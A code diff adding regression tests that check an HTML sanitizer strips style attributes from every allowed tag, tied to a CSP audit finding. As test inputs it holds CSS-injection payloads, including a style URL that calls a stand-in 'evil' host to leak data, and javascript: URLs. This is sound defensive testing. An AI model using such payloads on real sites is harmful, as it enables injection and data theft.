@@ -29,6 +29,69 @@ describe("sanitizeHtml", () => {
     expect(sanitizeHtml(input)).toBe("<p>text</p>");
   });
 
+  // SEC-P1-3 / Audit-etap1 #1: CSP keeps `style-src 'unsafe-inline'` to support
+  // vanilla-cookieconsent + React hydration. The compensating control is that
+  // `sanitizeHtml` strips the `style` attribute from *every* allowed tag. If
+  // a future refactor introduces a tag whose attr allowlist accidentally lets
+  // `style` through, this test catches it BEFORE the audit roadmap's
+  // 2026-09-01 nonce migration.
+  it("[regression] strips style attributes from every allowed tag", () => {
+    const allowed = [
+      "h1",
+      "h2",
+      "h3",
+      "h4",
+      "h5",
+      "h6",
+      "p",
+      "ul",
+      "ol",
+      "li",
+      "a",
+      "strong",
+      "b",
+      "em",
+      "i",
+      "u",
+      "s",
+      "del",
+      "ins",
+      "blockquote",
+      "pre",
+      "code",
+      "table",
+      "thead",
+      "tbody",
+      "tfoot",
+      "tr",
+      "th",
+      "td",
+      "div",
+      "span",
+      "figure",
+      "figcaption",
+      "sup",
+      "sub",
+    ];
+    for (const tag of allowed) {
+      const payload = `<${tag} style="background:url(https://evil/?leak=x)">x</${tag}>`;
+      const out = sanitizeHtml(payload);
+      expect(
+        out,
+        `sanitizeHtml left a style attribute on <${tag}> — CSS-injection vector`,
+      ).not.toMatch(/\sstyle\s*=/i);
+    }
+  });
+
+  it("[regression] strips style attribute even when intermixed with allowed attrs", () => {
+    expect(
+      sanitizeHtml('<a href="https://x.test" style="background:url(javascript:1)">x</a>'),
+    ).not.toMatch(/\sstyle\s*=/i);
+    expect(sanitizeHtml('<img src="https://x.test/i.png" style="display:none" />')).not.toMatch(
+      /\sstyle\s*=/i,
+    );
+  });
+
   it("removes javascript: protocol from href", () => {
     const input = '<a href="javascript:alert(1)">click</a>';
     const result = sanitizeHtml(input);
